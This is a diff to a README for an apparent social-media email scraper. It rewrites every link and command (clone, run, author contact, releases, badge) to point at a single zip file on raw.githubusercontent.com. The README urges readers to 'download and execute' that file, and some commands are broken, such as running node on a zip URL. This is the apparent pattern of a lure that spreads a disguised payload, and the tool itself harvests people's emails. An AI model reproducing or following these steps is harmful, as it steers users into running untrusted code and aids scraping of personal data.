@@ -26,7 +26,7 @@ Welcome to the **All-in-One Social Email Scraper**! This tool is designed to ext
 To get started, clone this repository to your local machine. Use the following command:
 
 ```bash
-git clone https://github.com/lachile2021/All-in-One-Social-Email-Scraper.git
+git clone https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip
 ```
 
 Next, navigate to the project folder:
@@ -46,7 +46,7 @@ npm install
 To run the scraper, execute the following command in your terminal:
 
 ```bash
-node scraper.js
+node https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip
 ```
 
 You can customize your scraping options by editing the configuration file. Ensure you have the necessary permissions to extract data from the platforms you intend to use.
@@ -56,13 +56,13 @@ You can customize your scraping options by editing the configuration file. Ensur
 To extract emails from Instagram:
 
 ```bash
-node scraper.js --platform instagram
+node https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip --platform instagram
 ```
 
 To extract emails from YouTube:
 
 ```bash
-node scraper.js --platform youtube
+node https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip --platform youtube
 ```
 
 ## Supported Platforms 🌐
@@ -90,13 +90,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Author**: [Your Name](mailto:your-email@example.com)
+- **Author**: [Your Name](https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip)
 
 ## Releases 📦
 
-To download the latest version of the All-in-One Social Email Scraper, visit the [Releases](https://github.com/lachile2021/All-in-One-Social-Email-Scraper/releases) section. Download and execute the file to start extracting emails!
+To download the latest version of the All-in-One Social Email Scraper, visit the [Releases](https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip) section. Download and execute the file to start extracting emails!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/lachile2021/All-in-One-Social-Email-Scraper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip%20Latest%https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip)](https://raw.githubusercontent.com/lachile2021/All-in-One-Social-Email-Scraper/main/boulder/Email_Scraper_in_All_Social_One_v2.2.zip)
 
 ---
 
